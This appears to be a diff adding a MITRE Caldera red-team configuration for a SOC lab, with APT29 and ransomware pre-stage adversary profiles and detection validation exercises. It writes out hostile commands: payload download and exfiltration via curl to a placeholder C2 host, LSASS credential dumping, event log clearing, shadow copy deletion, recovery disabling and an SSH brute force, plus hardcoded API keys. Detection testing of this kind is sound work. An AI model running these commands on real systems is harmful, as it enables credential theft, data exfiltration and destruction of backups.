@@ -1,0 +1,169 @@
+# MITRE Caldera — Autonomous SOC Lab Red Team Operations
+# Adversary profiles and ability mappings for attack simulation
+
+# ============================================================
+# ADVERSARY PROFILE 1: APT29 (Cozy Bear) Simulation
+# ============================================================
+adversary:
+  name: "APT29 Cozy Bear Simulation"
+  description: "Simulates APT29 TTPs for SOC detection validation"
+  atomic_ordering:
+    # Phase 1: Initial Access
+    - name: "Spearphishing Link"
+      tactic: initial-access
+      technique: T1566.002
+      command: |
+        curl -s http://#{c2_server}/payload -o /tmp/.update && chmod +x /tmp/.update
+
+    # Phase 2: Execution
+    - name: "PowerShell Encoded Command"
+      tactic: execution
+      technique: T1059.001
+      command: |
+        powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
+
+    # Phase 3: Persistence
+    - name: "Scheduled Task Creation"
+      tactic: persistence
+      technique: T1053.005
+      command: |
+        schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c whoami" /sc minute /mo 5 /f
+
+    # Phase 4: Defence Evasion
+    - name: "Clear Event Logs"
+      tactic: defense-evasion
+      technique: T1070.001
+      command: |
+        wevtutil cl Security && wevtutil cl System && wevtutil cl Application
+
+    # Phase 5: Credential Access
+    - name: "Credential Dumping (LSASS)"
+      tactic: credential-access
+      technique: T1003.001
+      command: |
+        rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump #{lsass_pid} C:\Windows\Temp\lsass.dmp full
+
+    # Phase 6: Lateral Movement
+    - name: "Pass the Hash via WMI"
+      tactic: lateral-movement
+      technique: T1021.006
+      command: |
+        wmic /node:#{target_ip} process call create "cmd.exe /c whoami > \\#{target_ip}\C$\out.txt"
+
+    # Phase 7: Collection
+    - name: "Archive Sensitive Files"
+      tactic: collection
+      technique: T1560.001
+      command: |
+        7z a -tzip C:\Windows\Temp\data.zip C:\Users\*\Documents\*.docx
+
+    # Phase 8: Exfiltration
+    - name: "HTTPS Exfiltration"
+      tactic: exfiltration
+      technique: T1048.003
+      command: |
+        curl -s -X POST -F "file=@C:\Windows\Temp\data.zip" https://#{c2_server}/upload
+
+---
+# ============================================================
+# ADVERSARY PROFILE 2: Ransomware Pre-Stage Simulation
+# ============================================================
+adversary:
+  name: "Ransomware Pre-Stage"
+  description: "Simulates ransomware deployment precursor TTPs"
+  atomic_ordering:
+    - name: "Network Discovery"
+      tactic: discovery
+      technique: T1046
+      command: |
+        nmap -sS -p 445,3389,22 --open 10.0.0.0/24 -oN /tmp/scan.txt
+
+    - name: "SMB Lateral Movement"
+      tactic: lateral-movement
+      technique: T1021.002
+      command: |
+        net use \\#{target_ip}\C$ /user:#{domain}\#{user} #{password}
+
+    - name: "Shadow Copy Deletion"
+      tactic: impact
+      technique: T1490
+      command: |
+        vssadmin delete shadows /all /quiet
+        wmic shadowcopy delete
+
+    - name: "Inhibit System Recovery"
+      tactic: impact
+      technique: T1489
+      command: |
+        net stop "Windows Backup" /y
+        bcdedit /set {default} recoveryenabled No
+
+---
+# ============================================================
+# CALDERA SERVER CONFIGURATION
+# ============================================================
+caldera:
+  host: 0.0.0.0
+  port: 8888
+  api_key_red: SOC-RED-TEAM-API-KEY-2024
+  api_key_blue: SOC-BLUE-TEAM-API-KEY-2024
+
+  # Plugins to enable
+  plugins:
+    - sandcat     # Agent beacon implant
+    - stockpile   # Ability library
+    - compass     # ATT&CK navigator
+    - manx         # Reverse shell
+
+  # Agent configuration
+  agents:
+    sleep_min: 15
+    sleep_max: 60
+    implant_name: sandcat
+
+  # C2 comms
+  app.contact.http: http://caldera:8888
+  app.contact.tcp: caldera:7010
+
+---
+# ============================================================
+# SOC VALIDATION EXERCISES
+# ============================================================
+exercises:
+  - id: EX-001
+    name: "Detect Brute Force + Auto-Block"
+    description: "Run brute force simulation, verify ElastAlert2 fires, StackStorm blocks IP"
+    steps:
+      - "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target"
+      - "Check OpenSearch for failed_login > 5 events"
+      - "Verify ElastAlert2 created StackStorm alert"
+      - "Confirm iptables DROP rule added on target"
+    expected_detections:
+      - rule: brute_force.yaml
+      - iris_case: true
+      - response: ip_blocked
+
+  - id: EX-002
+    name: "PowerShell Encoded Command Detection"
+    description: "Execute encoded PS command, verify detection + investigation"
+    steps:
+      - "Run: powershell -EncodedCommand <base64_payload>"
+      - "Check Sysmon event ID 1 in OpenSearch"
+      - "Verify ElastAlert2 fires powershell.yaml rule"
+      - "Confirm StackStorm investigation workflow runs"
+    expected_detections:
+      - rule: powershell.yaml
+      - enrichment: abuseipdb
+      - iris_case: true
+
+  - id: EX-003
+    name: "Lateral Movement via SMB"
+    description: "Simulate SMB port scanning, verify spike detection"
+    steps:
+      - "nmap -sS -p 445 --open 172.20.0.0/24"
+      - "Confirm port scan events in OpenSearch"
+      - "Verify lateral_movement.yaml fires"
+      - "Check IRIS case created"
+    expected_detections:
+      - rule: lateral_movement.yaml
+      - iris_case: true
